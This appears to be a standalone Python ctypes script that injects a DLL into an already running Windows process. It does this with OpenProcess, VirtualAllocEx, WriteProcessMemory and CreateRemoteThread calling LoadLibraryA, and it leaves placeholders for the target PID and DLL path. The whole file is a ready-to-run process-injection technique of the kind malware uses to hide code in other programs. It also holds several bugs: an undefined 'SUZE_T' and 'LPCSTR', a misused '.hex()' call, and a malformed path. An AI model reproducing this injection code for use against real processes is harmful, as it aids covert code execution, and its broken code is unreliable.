# Remote DLL injection on already running process

# Importing Modules
from ctypes import *
from ctypes import wintypes

# Adding constants and variables
kernel32 = windll.kernel32
LPCTSTR = c_char_p
SIZE_T = c_size_t

# The function definitions
# Open Process Function (Opens an exsisting local process object)
OpenProcess = kernel32.OpenProcess
OpenProcess.argtypes = (wintypes.DWORD, wintypes.BOOL, wintypes.DWORD)
OpenProcess.restype = wintypes.HANDLE

# WriteProcessMemory Function (Writes data to an area of memoty in a specified process)
WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = (wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, SIZE_T, POINTER(SUZE_T))
WriteProcessMemory.restype = wintypes.BOOL

#GetModuleHandle Function (Recieves a module handle for specified module)
GetModuleHandle = kernel32.GetModuleHandleA
GetModuleHandle.argtypes = (LPCTSTR, )
GetModuleHandle.restype = wintypes.HANDLE

# GetProcAddress Function (Retrieves the address of an exported function or variable from teh specified dynamic link library)
GetProcAddress = kernel32.GetProcAddress
GetProcAddress.argtypes = (wintypes.HANDLE, LPCSTR)
GetProcAddress.restype = wintypes.LPVOID

# VirtualAllocEx Function (Reserves, commits or changes the state of a region of memory within the virtual address space of a specified process)
VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD, wintypes.DWORD)
VirtualAllocEx.restype = wintypes.LPVOID


# CreateRemoteThread Function (Creates a thread that runs in the virtual address space of another process)
class _SECURITY_ATTRIBUTES(Structure):
    _fields_ = [('nLength', wintypes.DWORD),
                ('lpSecurityDescriptor', wintypes.LPVOID),
                ('bInheritHandle', wintypes.BOOL),]

SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES
LPSECURITY_ATTRIBUTES = POINTER(_SECURITY_ATTRIBUTES)
LPTHREAD_START_ROUTINE = wintypes.LPVOID

CreateRemoteThread = kernel32.CreateRemoteThread
CreateRemoteThread.argtypes = (wintypes.HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, wintypes.LPVOID, wintypes.DWORD, wintypes.LPDWORD)
CreateRemoteThread.restype = wintypes.HANDLE

# Constants to work with memory
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_READWRITE = 0x04
EXECUTE_IMMEDIATELY = 0x0
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0x00000FFF)

dll = b"C:\\User\\user\\Documents\\helloworld.dll" # Path to dll (Edit Before Running)

# Injecting into exsisting process
pid = 2160 # Change the id to process you want to attach the DLL into 

# Creating the handle
handle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
if not handle:
    raise WinError()

print("Handle Obtained => {0:X}".format(handle))

# Changing the state of the virtual memory
remote_memory = VirtualAllocEx(handle, False, len(dll)+1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
if not remote_memory:
    raise WinError()

print("Memory allocated => ".hex(remote_memory))

# Injecting the DLL
write = WriteProcessMemory(handle, remote_memory, dll, len(dll) + 1, None)

if not write:
    raise WinError()

print("Bytes written => {}".format(dll))

load_lib = GetProcAddress(GetModuleHandle(b"kernel32.dll") , b"LoadLibraryA")

print("LoadLibrary address => ", hex(load_lib))

# Remote Thread
rthread = CreateRemoteThread(handle, None, 0, load_lib, remote_memory, EXECUTE_IMMEDIATELY, None)